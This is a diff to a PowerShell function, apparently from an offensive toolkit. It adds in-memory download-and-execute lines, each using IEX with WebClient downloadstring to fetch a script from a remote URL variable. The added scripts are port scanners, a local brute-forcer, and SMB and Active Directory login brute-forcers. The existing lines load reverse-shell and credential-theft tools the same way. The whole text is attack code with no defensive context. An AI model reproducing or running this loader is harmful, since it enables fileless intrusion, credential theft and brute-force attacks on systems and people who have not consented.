@@ -47,6 +47,12 @@ function Memory_Load {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/MailSniper.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/powercat.txt")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Sharpweb.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/port-scan-tcp.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/port-scan-udp.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/localbrute.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/smblogin.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/adlogin.ps1")
+
     $global:mem_1029384756=1
 }
 
